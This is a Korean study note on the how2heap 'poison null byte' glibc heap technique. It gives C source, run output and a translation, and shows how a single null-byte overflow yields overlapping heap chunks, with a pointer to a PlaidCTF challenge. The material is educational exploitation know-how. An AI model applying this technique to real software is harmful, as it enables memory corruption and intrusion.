# How2Heap Study 06 Poison Null Byte

## Tech Overview

Exploiting a single null byte overflow.

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>


int main()
{
	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;

	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	fprintf(stderr, "a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	fprintf(stderr, "b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	fprintf(stderr, "c: %p\n", c);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x1f0) = 0x200;
	fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x1f0) = 0x200;

	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);

	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
	fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	b1 = malloc(0x100);

	fprintf(stderr, "b1: %p\n",b1);
	fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %lx\n",*c_prev_size_ptr);
	fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x80);
	fprintf(stderr, "b2: %p\n",b2);

	memset(b2,'B',0x80);
	fprintf(stderr, "Current b2 content:\n%s\n",b2);

	fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
	free(c);
	
	fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	fprintf(stderr, "d: %p\n",d);
	
	fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	fprintf(stderr, "New b2 content:\n%s\n",b2);

	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
		"for the clear explanation of this technique.\n");
}
```

## Output

```
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0xdd5010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0xdd5120
c: 0xdd5330
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0xdd5120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0xdd5230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0xdd5120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.
```

## 개요 번역

Exploiting a single null byte overflow.
1개의 null 바이트 오버플로우 공격을 합니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
Welcome to poison null byte 2.0!
poison null byte 2.0 공격에 오신 것을 환영합니다!

Tested in Ubuntu 14.04 64bit.
우분투 14.04 64bit 에서 테스트 되었습니다. (이 출력의 기반은 우분투 16.04 64bit)

This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
이 기술은 당신이 malloc 으로 할당한 구역 중, null 바이트를 이용한 off-by-one 취약점을 가지고 있을 때 사용할 수 있습니다.

We allocate 0x100 bytes for 'a'.
'a' 0x100 바이트를 할당합니다.

a: 0xdd5010

Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
'a' 를 오버플로우 공격하기 위해서는 'a'의 '진짜' 크기를 알 필요가 있습니다. (이것은 올림 연산 때문에 0x100 보다 클 것입니다.) : 0x108

b: 0xdd5120
c: 0xdd5330

In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
새로운 버젼의 glibc 에서는 b 내부의 크기 값을 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하기 위해서 맞춰줘야 할 필요가 있습니다.

b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use

We overflow 'a' with a single null byte into the metadata of 'b'
'b'의 메타데이터 안에 'a' 를 오버플로우 하여 1 개의 null 바이트를 넣을 것입니다.

b.size: 0x200
c.prev_size is 0x210

We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
이제 'chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))' 를 만족하기 때문에 검사를 통과할 것입니다.

b1: 0xdd5120

Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 210
이제 'b1' 을 할당한다. 이것은 'b' 가 놓일 것이다. 이 지점에서는 c.prev_size 가 업데이트 되어있어야 하지만, 그렇지 않습니다 : 210

Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
흥미롭게도, 변경된 c.prev_size 는 c.prev_size 위치의 0x10 바이트 뒤에 쓰여졌습니다. : f0

We malloc 'b2', our 'victim' chunk.
공격 대상 청크에 'b2' 를 할당합니다.

b2: 0xdd5230

Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
현재의 b2 내용

Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
이제 'b1' 과 'c' 를 해제한다. - 이것은 'b1' 과 'c' 를 통합할 것입니다. ('b2'에 대해서는 잊으세요)

Finally, we allocate 'd', overlapping 'b2'.
마지막으로, 우리는 'd'를 할당하고, 'b2' 를 덮어씁니다.

d: 0xdd5120

Now 'd' and 'b2' overlap.
이제 'd'는 'b2'를 덮어썼습니다.

New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
새로운 b2의 내용

Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.
이 기술에 대한 깨끗한 설명을 해준 위 문서에 대해 감사를 표합니다.
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* PlaidCTF 2015-plaiddb [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb)